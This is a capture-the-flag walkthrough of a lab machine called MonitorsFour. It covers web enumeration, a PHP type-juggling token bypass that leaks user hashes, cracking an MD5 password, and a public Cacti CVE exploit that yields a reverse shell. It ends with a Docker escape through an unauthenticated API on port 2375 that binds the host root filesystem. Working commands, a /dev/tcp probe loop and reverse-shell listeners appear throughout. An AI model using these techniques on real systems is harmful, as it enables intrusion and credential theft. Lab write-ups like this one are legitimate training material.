Port scan:
```bash
nmap -p- --min-rate=5000 10.10.11.98  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-15 09:31 EST
Nmap scan report for 10.10.11.98
Host is up (0.17s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 27.71 seconds
                                                                                                                 
┌──(kali㉿kali)-[~]
└─$ nmap -p 80,5985 -sC -sV 10.10.11.98 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-15 09:32 EST
Nmap scan report for 10.10.11.98
Host is up (0.082s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx
|_http-title: Did not follow redirect to http://monitorsfour.htb/
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.30 seconds
```

Ok so we got a website and we add monitorsfour.htb to our /etc/hosts
There is also a Wsman which allows the admins to manage windows systems remotely using command line tools. If its misconfigured it can be used as an attack surface.

I started with the website since thats our only way in at the moment. I found an username sales@monitorsfour.htb which could be used later.

```bash
[10:08:15] Starting:                                                                                             
[10:08:34] 200 -   97B  - /.env                                             
[10:08:47] 403 -  548B  - /.ht_wsr.txt                                      
[10:08:47] 403 -  548B  - /.htaccess.bak1                                   
[10:08:47] 403 -  548B  - /.htaccess.orig                                   
[10:08:47] 403 -  548B  - /.htaccess.sample                                 
[10:08:47] 403 -  548B  - /.htaccess.save                                   
[10:08:47] 403 -  548B  - /.htaccess_extra
[10:08:47] 403 -  548B  - /.htaccess_orig                                   
[10:08:47] 403 -  548B  - /.htaccess_sc
[10:08:47] 403 -  548B  - /.htaccessOLD
[10:08:47] 403 -  548B  - /.htaccessBAK
[10:08:47] 403 -  548B  - /.htaccessOLD2
[10:08:47] 403 -  548B  - /.htm                                             
[10:08:47] 403 -  548B  - /.html                                            
[10:08:47] 403 -  548B  - /.htpasswds                                       
[10:08:47] 403 -  548B  - /.httr-oauth
[10:08:47] 403 -  548B  - /.htpasswd_test                                   
[10:11:15] 200 -  367B  - /contact                                          
[10:11:17] 403 -  548B  - /controllers/                                     
[10:12:27] 200 -    4KB - /login                                            
[10:13:48] 301 -  162B  - /static  ->  http://monitorsfour.htb/static/      
[10:14:13] 200 -   35B  - /user                                             
[10:14:23] 301 -  162B  - /views  ->  http://monitorsfour.htb/views/        
```

The .env file had database credentials in there. 
cur
```bash
monitorsdbuser:f37p2j8f4t0r
```

I also performed a subdomain scan with ffuf and we got a hit
```bash
cacti                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1099ms]
```
It brings us to a login screen. In the bottom it tells us the version of cacti and i looked up for possible cves of that version. I also did a dir scan for the site.
The dir scan found nothing of interest but I found this
https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-Poc

But I still needed credentials so its not of use rn. So I was stuck. I decided to go back to the main website since the /user was priting and odd error of a missing token parameter. I decided to try to bruteforce and see if we can get the token through that method. 

After consulting AI I made them create me a .txt file to bruteforce the token with. 

We got multiple hits which is great
```bash
ffuf -c -u "http://monitorsfour.htb/user?token=FUZZ" -w brute.txt -fs 36

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://monitorsfour.htb/user?token=FUZZ
 :: Wordlist         : FUZZ: /home/kali/monitorsfour/CVE-2025-24367-Cacti-PoC/brute.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 36
________________________________________________

0E0                     [Status: 200, Size: 1113, Words: 10, Lines: 1, Duration: 77ms]
0e1                     [Status: 200, Size: 1113, Words: 10, Lines: 1, Duration: 91ms]
00                      [Status: 200, Size: 1113, Words: 10, Lines: 1, Duration: 102ms]
0.0                     [Status: 200, Size: 1113, Words: 10, Lines: 1, Duration: 115ms]
000                     [Status: 200, Size: 1113, Words: 10, Lines: 1, Duration: 120ms]
0E00                    [Status: 200, Size: 1113, Words: 10, Lines: 1, Duration: 124ms]
0e10                    [Status: 200, Size: 1113, Words: 10, Lines: 1, Duration: 125ms]
0e100                   [Status: 200, Size: 1113, Words: 10, Lines: 1, Duration: 129ms]
0e545993274517709034328855841020 [Status: 200, Size: 1113, Words: 10, Lines: 1, Duration: 134ms]
0e830400451993494058024219903391 [Status: 200, Size: 1113, Words: 10, Lines: 1, Duration: 138ms]
0.00                    [Status: 200, Size: 1113, Words: 10, Lines: 1, Duration: 148ms]
0e123456                [Status: 200, Size: 1113, Words: 10, Lines: 1, Duration: 153ms]
0e999999                [Status: 200, Size: 1113, Words: 10, Lines: 1, Duration: 153ms]
0e0                     [Status: 200, Size: 1113, Words: 10, Lines: 1, Duration: 153ms]
0e0012345               [Status: 200, Size: 1113, Words: 10, Lines: 1, Duration: 159ms]
0e1337                  [Status: 200, Size: 1113, Words: 10, Lines: 1, Duration: 156ms]
0e-10                   [Status: 200, Size: 1113, Words: 10, Lines: 1, Duration: 165ms]
0e000                   [Status: 200, Size: 1113, Words: 10, Lines: 1, Duration: 178ms]
0e462097431906509019562988736854 [Status: 200, Size: 1113, Words: 10, Lines: 1, Duration: 187ms]
0e31337                 [Status: 200, Size: 1113, Words: 10, Lines: 1, Duration: 187ms]
0e830400451993494058024219903391 [Status: 200, Size: 1113, Words: 10, Lines: 1, Duration: 193ms]
0e999999999             [Status: 200, Size: 1113, Words: 10, Lines: 1, Duration: 193ms]
0                       [Status: 200, Size: 1113, Words: 10, Lines: 1, Duration: 205ms]
0e462097431906509019562988736854 [Status: 200, Size: 1113, Words: 10, Lines: 1, Duration: 201ms]
0e00                    [Status: 200, Size: 1113, Words: 10, Lines: 1, Duration: 209ms]
```

I just chose a random hash and i got this

```bash
 curl -i http://monitorsfour.htb/user?token=0E0   
HTTP/1.1 200 OK
Server: nginx
Date: Mon, 15 Dec 2025 16:59:50 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/8.3.27
Set-Cookie: PHPSESSID=450d24395b5f9b830e13abc466ebe12a; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

[{"id":2,"username":"admin","email":"admin@monitorsfour.htb","password":"56b32eb43e6f15395f6c46c1c9e1cd36","role":"super user","token":"66260929f14747b3eb","name":"Marcus Higgins","position":"System Administrator","dob":"1978-04-26","start_date":"2021-01-12","salary":"320800.00"},{"id":5,"username":"mwatson","email":"mwatson@monitorsfour.htb","password":"69196959c16b26ef00b77d82cf6eb169","role":"user","token":"0e543210987654321","name":"Michael Watson","position":"Website Administrator","dob":"1985-02-15","start_date":"2021-05-11","salary":"75000.00"},{"id":6,"username":"janderson","email":"janderson@monitorsfour.htb","password":"2a22dcf99190c322d974c8df5ba3256b","role":"user","token":"0e999999999999999","name":"Jennifer Anderson","position":"Network Engineer","dob":"1990-07-16","start_date":"2021-06-20","salary":"68000.00"},{"id":7,"username":"dthompson","email":"dthompson@monitorsfour.htb","password":"8d4a7e7fd08555133e056d9aacb1e519","role":"user","token":"0e111111111111111","name":"David Thompson","position":"Database Manager","dob":"1982-11-23","start_date":"2022-09-15","salary":"83000.00"}]
```

There we clearly have a hash of the admins password. Im guessing we can use it for the cacti site and use the previously found CVE also which required login details.

I bruteforced the hash with hashcat after identifying it as md5

```bash
 hashcat -m 0 -a 0 hash /usr/share/wordlists/rockyou.txt

56b32eb43e6f15395f6c46c1c9e1cd36:wonderful1 
```

It didnt work for the cacti but it worked for the original site and now we are logged in as admin. I was kinda confused since what was the point of the cacti website. I re-read the previous curl and noticed that the admin account also has the name Marcus Higgins connected to it and after putting the username of marcus to the cacti we were able to log in.


Now i decided to try the previous CVE

```bash
python3 exploit.py -u marcus -p wonderful1 -i 10.10.11.98 -l 4444 -url http://cacti.monitorsfour.htb                
[+] Cacti Instance Found!
[+] Serving HTTP on port 80
[+] Login Successful!
[+] Got graph ID: 226
[i] Created PHP filename: mF7xZ.php
[i] Created PHP filename: kc1lO.php
[+] Stopped HTTP server on port 80
```

For some reason i didnt get a reverse shell from the exploit. Ah... I just had a wrong IP address in the exploit. I accidentally had put their IP into it so my reverse shell was going back to them. Stupid mistake.

```bash
nc -lvnp 5555  
listening on [any] 5555 ...
connect to [10.10.14.42] from (UNKNOWN) [10.10.11.98] 50624
bash: cannot set terminal process group (8): Inappropriate ioctl for device
bash: no job control in this shell
www-data@821fbd6a43fa:~/html/cacti$ ls

cat user.txt
cat user.txt
703b6a618eb80f9eeb4942c34844e253
```

I tried logging in to marcus but he doesn't have the same password. Then I remembered that we got the .env file with the database password.

```bash
www-data@821fbd6a43fa:~/html/cacti$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@821fbd6a43fa:~/html/cacti$ mariadb -h mariadb -u monitorsdbuser -pf37p2j8f4t0r monitorsfour_db
<db -u monitorsdbuser -pf37p2j8f4t0r monitorsfour_db
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 7168
Server version: 11.4.8-MariaDB-ubu2404 mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [monitorsfour_db]> 
```

We were able to login to the database.

```bash
MariaDB [monitorsfour_db]> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| monitorsfour_db    |
+--------------------+
2 rows in set (0.001 sec)

MariaDB [monitorsfour_db]> use monitorsfour_db;
use monitorsfour_db;
Database changed
MariaDB [monitorsfour_db]> show tables;
show tables;
+---------------------------+
| Tables_in_monitorsfour_db |
+---------------------------+
| changelog                 |
| customers                 |
| invoice_tasks             |
| invoices                  |
| tasks                     |
| users                     |
+---------------------------+
6 rows in set (0.001 sec)

MariaDB [monitorsfour_db]> select * from users;
select * from users;
+----+-----------+----------------------------+----------------------------------+------------+--------------------+-------------------+-----------------------+------------+------------+-----------+
| id | username  | email                      | password                         | role       | token              | name              | position              | dob        | start_date | salary    |
+----+-----------+----------------------------+----------------------------------+------------+--------------------+-------------------+-----------------------+------------+------------+-----------+
|  2 | admin     | admin@monitorsfour.htb     | 56b32eb43e6f15395f6c46c1c9e1cd36 | super user | 17b65ccc8bb7c663ae | Marcus Higgins    | System Administrator  | 1978-04-26 | 2021-01-12 | 320800.00 |
|  5 | mwatson   | mwatson@monitorsfour.htb   | 69196959c16b26ef00b77d82cf6eb169 | user       | 0e543210987654321  | Michael Watson    | Website Administrator | 1985-02-15 | 2021-05-11 |  75000.00 |
|  6 | janderson | janderson@monitorsfour.htb | 2a22dcf99190c322d974c8df5ba3256b | user       | 0e999999999999999  | Jennifer Anderson | Network Engineer      | 1990-07-16 | 2021-06-20 |  68000.00 |
|  7 | dthompson | dthompson@monitorsfour.htb | 8d4a7e7fd08555133e056d9aacb1e519 | user       | 0e111111111111111  | David Thompson    | Database Manager      | 1982-11-23 | 2022-09-15 |  83000.00 |
+----+-----------+----------------------------+----------------------------------+------------+--------------------+-------------------+-----------------------+------------+------------+-----------+
```

It was just the same passwords that we had previously. I kinda quessed that but kinda makes sense.

I did a linpeas.sh scan and we are in a docker container. I was wondering whats the point of the machine being a windows machine sinces so far its all been linux. 

I had to do alot of research to findout how to escape the docker environment.



```bash
for p in 2375 2376 2377 9000 8080 8443 6443; do
  (timeout 0.2 bash -c "echo >/dev/tcp/192.168.65.7/$p" 2>/dev/null) \
    && echo "[+] $p OPEN"
<ti$ for p in 2375 2376 2377 9000 8080 8443 6443; do
>   (timeout 0.2 bash -c "echo >/dev/tcp/192.168.65.7/$p" 2>/dev/null) \
>     && echo "[+] $p OPEN"
> 
done
[+] 2375 OPEN
```
We had pretty much 0 tools on the machine so I used gpt to quickly create me this poorly made port scanner which is good enough for our purposes.

With this we are able to see that port 2375 is open. 

This is the point where i decided to take a break since I felt like I was going nowhere.

We check the Dockers api access

```bash
curl http://192.168.65.7:2375/containers/json
```

and we received loads of info 

```bash
[{"Id":"821fbd6a43fa182c5c884990fe74c22a80c1ec36db6adee758fdfa69bd4675b1","Names":["/web"],"Image":"docker_setup-nginx-php","ImageID":"sha256:93b5d01a98de324793eae1d5960bf536402613fd5289eb041bac2c9337bc7666","ImageManifestDescriptor":{"mediaType":"application/vnd.oci.image.manifest.v1+json","digest":"sha256:ff7427b740fa0fbb79ed506e028edfed7263ffc3a0c666510c86706ad3690350","size":4281,"platform":{"architecture":"amd64","os":"linux"}},"Command":"docker-php-entrypoint /start.sh","Created":1762794284,"Ports":[{"IP":"0.0.0.0","PrivatePort":80,"PublicPort":80,"Type":"tcp"},{"PrivatePort":9000,"Type":"tcp"}],"Labels":{"com.docker.compose.config-hash":"54a0d318f0f4ed9d35902f0c007a2bff60c5689a1c94f8ef7a94db7798386afd","com.docker.compose.container-number":"1","com.docker.compose.depends_on":"mariadb:service_healthy:false","com.docker.compose.image":"sha256:93b5d01a98de324793eae1d5960bf536402613fd5289eb041bac2c9337bc7666","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker_setup","com.docker.compose.project.config_files":"C:\\Users\\Administrator\\Documents\\docker_setup\\docker-compose.yml","com.docker.compose.project.working_dir":"C:\\Users\\Administrator\\Documents\\docker_setup","com.docker.compose.service":"nginx-php","com.docker.compose.version":"2.39.1","desktop.docker.io/ports.scheme":"v2","desktop.docker.io/ports/80/tcp":":80"},"State":"running","Status":"Up 3 hours","HostConfig":{"NetworkMode":"docker_setup_default"},"NetworkSettings":{"Networks":{"docker_setup_default":{"IPAMConfig":null,"Links":null,"Aliases":null,"MacAddress":"ce:4a:30:f7:a1:76","DriverOpts":null,"GwPriority":0,"NetworkID":"dbe8d772bacc3571da48a759376f0d8afddbe5453e8ee10b3cffd993ef5e3dec","EndpointID":"afa4cfce6364f7323e3da5a4ffb02fd4777d20133fb6986fc82959f4855e94c9","Gateway":"172.18.0.1","IPAddress":"172.18.0.3","IPPrefixLen":16,"IPv6Gateway":"","GlobalIPv6Address":"","GlobalIPv6PrefixLen":0,"DNSNames":null}}},"Mounts":[]},{"Id":"c2bdd5d10cc52dc02e046bbedec91178cc2e6a12403e3323b7b120f7eb77c2b2","Names":["/mariadb"],"Image":"docker_setup-mariadb","ImageID":"sha256:74ffe0cfb45116e41fb302d0f680e014bf028ab2308ada6446931db8f55dfd40","ImageManifestDescriptor":{"mediaType":"application/vnd.oci.image.manifest.v1+json","digest":"sha256:ceab562c32247d164213f4df42a241a695ed1b2ae5a971f45791a3275635deee","size":2568,"platform":{"architecture":"amd64","os":"linux"}},"Command":"docker-entrypoint.sh mariadbd","Created":1762794283,"Ports":[{"IP":"0.0.0.0","PrivatePort":3306,"PublicPort":3306,"Type":"tcp"}],"Labels":{"com.docker.compose.config-hash":"ae62dae65eee61960eb7c7a1b1b2cf918aaa7a689721404b85b492772d396eb0","com.docker.compose.container-number":"1","com.docker.compose.depends_on":"","com.docker.compose.image":"sha256:74ffe0cfb45116e41fb302d0f680e014bf028ab2308ada6446931db8f55dfd40","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker_setup","com.docker.compose.project.config_files":"C:\\Users\\Administrator\\Documents\\docker_setup\\docker-compose.yml","com.docker.compose.project.working_dir":"C:\\Users\\Administrator\\Documents\\docker_setup","com.docker.compose.service":"mariadb","com.docker.compose.version":"2.39.1","desktop.docker.io/ports.scheme":"v2","desktop.docker.io/ports/3306/tcp":":3306","org.opencontainers.image.authors":"MariaDB Community","org.opencontainers.image.base.name":"docker.io/library/ubuntu:noble","org.opencontainers.image.description":"MariaDB Database for relational SQL","org.opencontainers.image.documentation":"https://hub.docker.com/_/mariadb/","org.opencontainers.image.licenses":"GPL-2.0","org.opencontainers.image.ref.name":"ubuntu","org.opencontainers.image.source":"https://github.com/MariaDB/mariadb-docker","org.opencontainers.image.title":"MariaDB Database","org.opencontainers.image.url":"https://github.com/MariaDB/mariadb-docker","org.opencontainers.image.vendor":"MariaDB Community","org.opencontainers.image.version":"11.4.8"},"State":"running","Status":"Up 3 hours (healthy)100  4712    0  4712    0     0   126k      0 --:--:-- --:--:-- --:--:--  127korks":{"docker_setup_default":{"IPAM
Config":null,"Links":null,"Aliases":null,"MacAddress":"ee:69:35:5d:da:bd","DriverOpts":null,"GwPriority":0,"NetworkID":"dbe8d772bacc3571da48a759376f0d8afddbe5453e8ee10b3cffd993ef5e3dec","EndpointID":"e460c7768f6ef4ead3774185ce3a1b5553c88e2ae565b7f750bb40c973fe2a81","Gateway":"172.18.0.1","IPAddress":"172.18.0.2","IPPrefixLen":16,"IPv6Gateway":"","GlobalIPv6Address":"","GlobalIPv6PrefixLen":0,"DNSNames":null}}},"Mounts":[{"Type":"volume","Name":"c037b802652b90f77688864756d7923900aaa2326ed97fe86213de892350e26c","Source":"","Destination":"/var/lib/mysql","Driver":"local","Mode":"","RW":true,"Propagation":""}]}]
```

This means the the API is authenticated.

We then created a new container with POST request

```bash
Making a new container
curl -X POST http://192.168.65.7:2375/containers/create \
-H "Content-Type: application/json" \
-d '{
  "Image":"alpine",
  "Cmd":["/bin/sh","-c","sleep infinity"],
  "Tty":true,
  "OpenStdin":true,
  "HostConfig":{"Binds":["/:/host"]}
}'

Starting it
curl -X POST http://192.168.65.7:2375/containers/8db293058e30eda5a09f712cfa97398eb026d4e74d7a7b19330d3da274cbd3f8/start

Accessing it
curl -X POST -H "Content-Type: application/json" \
http://192.168.65.7:2375/containers/8db293058e30eda5a09f712cfa97398eb026d4e74d7a7b19330d3da274cbd3f8/exec \
-d '{"AttachStdout": true, "AttachStderr": true, "Tty": true, "Cmd": ["id"]}'

exec id:71debd6c60f1addbf25b8131ff70f35a1bb57120e4c0d2e2fcf911afbb881dc5

lets view it:
curl -s -X POST http://192.168.65.7:2375/exec/3823d2ef8e612da25b1a260cf169060754a6a2774d83e95117c7276480775eb9/start \
-H "Content-Type: application/json" \
-d '{"Detach":false,"Tty":false}'

RESULTS:

curl -s -X POST http://192.168.65.7:2375/exec/3823d2ef8e612da25b1a260cf169060754a6a2774d83e95117c7276480775eb9/start \
-H "Content-Type: application/json" \
<60cf169060754a6a2774d83e95117c7276480775eb9/start \
> -H "Content-Type: application/json" \
> 
-d '{"Detach":false,"Tty":false}'
�uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```
Ok so we can see that it's executed. We have access to the main machine now we just need to figure out how to get the root.txt or reverse shell.
I decided to check if they have python3 so i could try to use it to get a shell.



Ok so its working we have root. I'll try to be lazy and search up for the flag.

```bash
 nc -lvnp 6666
listening on [any] 6666 ...
connect to [10.10.14.42] from (UNKNOWN) [10.10.11.98] 58300
whoami
root
```
I just changed the previous ID command into a shell.

The machine was so confusing so i just decided to use the find tool

```bash
find / -name "root.txt" 2>/dev/null
/host/mnt/host/c/Users/Administrator/Desktop/root.txt
75599936fb722e39f36551c5cf5a1236
```

